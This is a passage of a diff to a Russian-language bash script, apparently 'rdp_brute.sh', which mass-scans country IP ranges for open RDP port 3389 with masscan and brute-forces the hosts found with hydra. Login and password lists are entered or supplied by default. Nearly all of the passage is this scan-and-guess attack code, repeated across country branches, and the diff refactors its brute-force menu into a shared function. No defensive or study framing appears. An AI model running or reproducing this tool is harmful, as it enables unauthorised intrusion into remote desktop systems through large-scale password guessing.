-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8063,6 +3321,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8072,53 +3331,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8136,6 +3349,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8145,53 +3359,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8209,6 +3377,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8218,53 +3387,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8282,6 +3405,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8291,53 +3415,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8355,6 +3433,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8364,53 +3443,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "111" ]; then
@@ -8427,6 +3460,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8436,53 +3470,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8500,6 +3488,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8509,53 +3498,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8573,6 +3516,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8582,53 +3526,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8646,6 +3544,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8655,53 +3554,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8719,6 +3572,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8728,53 +3582,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8792,6 +3600,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8801,53 +3610,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -8865,6 +3628,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8874,53 +3638,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "118" ]; then
@@ -8937,6 +3655,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -8946,53 +3665,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9010,6 +3683,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9019,53 +3693,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
